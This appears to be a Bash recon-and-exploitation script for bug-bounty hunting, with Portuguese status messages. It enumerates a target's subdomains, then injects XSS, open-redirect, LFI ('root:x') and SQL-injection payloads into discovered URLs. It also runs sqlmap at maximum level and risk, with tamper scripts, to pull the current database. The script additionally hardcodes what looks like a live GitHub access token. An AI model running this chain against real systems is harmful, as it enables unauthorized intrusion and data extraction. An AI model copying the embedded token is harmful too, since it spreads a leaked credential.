#!/bin/bash

############################################subdomain enumaration########################################################
echo "Iniciando full recon " | notify;
for i in $(cat $1); do
	shuffledns -d $i -w /root/lists/subrecon.txt -r /root/lists/dns-resolvers.txt -o subsshuffledns;
	assetfinder -subs-only $i | anew subsasset;
	subfinder -d $i | anew subssubf;
	curl -s "https://crt.sh/?q=%25.$i&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew subscrt;
	findomain -t $i -q | anew subsf;
	python3 /root/tools/Sublist3r/sublist3r.py -d $i -o subslist3r;
	curl -s "https://rapiddns.io/subdomain/$i?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | anew subsrapid;
	curl -s https://dns.bufferover.run/dns?q=.$i |jq -r .FDNS_A[]|cut -d',' -f2| anew subsbuffer;
	curl -s "https://riddler.io/search/exportcsv?q=pld:$i" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew subsriddle; 
	curl -s "http://web.archive.org/cdx/search/cdx?url=*.$i/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | anew subsarchive;
	curl -s "https://jldc.me/anubis/subdomains/$i" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew subsjldc;
	curl --silent https://sonar.omnisint.io/subdomains/$i | grep -oE "[a-zA-Z0-9._-]+\.$i" | anew subssonar;
	chaos -d $i | anew subschaos;
	python3 /root/tools/github-search/github-subdomains.py -t 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 -d $i >> tmp; cat tmp | grep -v ">" >> subsgit;
	cat subs* | anew tudo;
	rm -rf subs* tmp;
done
echo "Ta acabando recon... amass e jsub " | notify;
amass enum -df $1 -active -p 443,8080,80,81,8081,8443 -config /root/.config/amass/config.ini -o subsamass;
cat subsamass tudo | anew tot;
jsubfinder -f tot | anew j200;
cat j200 tot | anew total;
rm tudo subsamass j200 tot;

########################################################################################################################
#############################################validando subdominios######################################################

echo "Validando subdominios " | notify;
cat total | httpx -threads 200 -random-agent -o 200;
cat 200 | anew total200; rm 200;
cat total | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -p https:10000 -p http:9000 -p https:9443 -c 50 | anew total200;

########################################################################################################################
#############################################subdomain takeover#########################################################

echo "searching for subdomain takeover" | notify;
python3 /root/tools/BugBountyTools/takeover/subTakeOver.py total200 | anew takeover | notify;

########################################################################################################################
##############################################  CORS  ##################################################################

echo "Searching for Cors vulnerabilities" | notify;
python3 /root/tools/Corsy/corsy.py -t 100 -i total200 -o cors-results.json;
/root/tools/BugBountyTools/cors-organization.sh;
cat vulnerable-cors.txt | notify; 

########################################################################################################################
##############################################collecting urls###########################################################

echo "Colentando urls " | notify;
cat total200 | waybackurls | anew wayback;
cat total200 | gauplus -t 100 --random-agent -b jpg,png,svg,jpeg,gif| anew gaup;
xargs -a $1 -I@ bash -c 'python3 /root/tools/ParamSpider/paramspider.py -d @ --exclude jpg,png,svg,jpeg,gif --output param';
cat wayback gaup output/param | anew urls;
rm -rf wayback gaup output;

echo "Validando URLS " | notify;
cat urls | httpx -threads 200 -random-agent -o url200;
rm urls;

########################################################################################################################
##################################################nuclei#################################################################

echo "Iniciando nuclei, bonitao " | notify;
nuclei -l total200 -t /root/nuclei-templates/ -severity low,medium,high,critical -o nuclei | notify;
echo "Acabou o nuclei " | notify;

########################################################################################################################
#################################################js files analyze#######################################################

#echo "analisando js " | notify;
#cat total200 | getJS --complete --resolve --output getjs;
#cat url200 | grep -iE '\.js'| grep -iEv '(\.jsp|\.json)' | anew urlsJS.txt;
#cat total200 | subjs | anew subsjs;
#cat urlsJS.txt getjs subsjs | anew saidaJS ;
#rm -rf urlsJS.txt getjs subsjs;
#cat saidaJS | httpx -threads 200 -random-agent -o AliveJs.txt;
#rm saidaJS;
#python3 /root/tools/LinkFinder/linkfinder.py -i AliveJs.txt -o cli;
#cat AliveJs.txt  | python3 /root/tools/Bug-Bounty-Toolz/collector.py outputJS;
#python3 /root/tools/secretfinder/SecretFinder.py -i AliveJs.txt -o cli | anew outputJS/resultJSPASS;
#echo -e "AliveJs.txt\n/root/tools/JSScanner/regex.txt" | python3 /root/tools/JSScanner/JSScanner.py;

#########################################################################################################################
##########################################searching for open redirect####################################################

echo "searching for Open Redirect" | notify;
cat url200 | gf redirect | anew redirect;
/root/tools/BugBountyTools/search-qsreplace.sh redirect "This domain is for use in illustrative examples in documents." /root/tools/BugBountyTools/payloads/openpayloads.txt redir;
/root/tools/BugBountyTools/search-path.sh total200 "This domain is for use in illustrative examples in documents." /root/tools/BugBountyTools/payloads/openpayloads.txt redir;

#python3 /root/tools/BugBountyTools/opr-lfi/opr-lfi-param.py opr redirect /root/tools/BugBountyTools/payloads/openpayloads.txt | anew openRedirect_results.txt | notify;
#python3 /root/tools/BugBountyTools/opr-lfi/opr-lfi-url.py opr total200Barra /root/tools/BugBountyTools/payloads/openpayloads.txt | anew openRedirect_results.txt | notify;
#mkdir openScan; mv redirect sqliScan/; mv openRedirect_results.txt openScan/;

#########################################################################################################################
#####################################################XSS#################################################################

echo "searching for XSS vulnearbilities" | notify;
cat url200 | gf xss | anew xss;
cat xss | gf xss | grep "source=" | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl -s --path-as-is -k "$host" | grep -qs "<script>confirm(1)" && echo "$host 33[0;31mVulnerablen";done >> xss_results.txt; cat xss_results.txt | notify;
#into redirection
echo "javascript:alert(%271%27)" > xr;
/root/tools/BugBountyTools/search-qsreplace.sh redirect "javascript:alert" xr xss-red;

#gospider -S total200 -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt

#########################################################################################################################
##############################################searching for ssrf#########################################################

echo "searching for ssrf" | notify;
cat url200 | gf ssrf | anew ssrf;
mkdir ssrfScan; mv ssrf ssrfScan/;

#########################################################################################################################
########################################################### lfi#########################################################

echo "searching for LFI" | notify;
cat url200 | gf lfi | anew lfi;
/root/tools/BugBountyTools/search-qsreplace.sh redirect "root:x" /root/tools/BugBountyTools/payloads/lfipayload.txt lfi;
/root/tools/BugBountyTools/search-path.sh total200 "root:x" /root/tools/BugBountyTools/payloads/lfipayload.txt lfi;

#python3 /root/tools/BugBountyTools/opr-lfi/opr-lfi-url.py "lfi" lfi /root/tools/BugBountyTools/payloads/lfipayload.txt | anew lfi_results.txt | notify;
#python3 /root/tools/BugBountyTools/opr-lfi/opr-lfi-url.py "lfi" total200Barra /root/tools/BugBountyTools/payloads/lfipayload.txt | anew lfi_results.txt | nortify;
#mkdir lfiScan; mv lfi_results.txt lfiScan/; mv lfi lfiScan/;

#########################################################################################################################
###############################################searching for sqli########################################################

echo "Iniciando procura por SQLinjection " | notify;
cat url200 | gf sqli | anew sqli;
cat sqli | qsreplace "'or 1=1#" | anew sqli_results.txt;
cat sqli_results.txt | httpx -threads 200 -random-agent -mc 200 -o sqli200 | notify;
sqlmap -m sqli200 --time-sec=15 --random-agent --level 5 --risk 3 --tamper=space2comment,between --current-db --batch --no-cast;
#mkdir sqliScan; mv sqli_results.txt sqliScan/; mv sqli sqliScan/; mv sqli200 sqliScan/;

#########################################################################################################################

echo "TOOL FINALIZADA! " | notify;

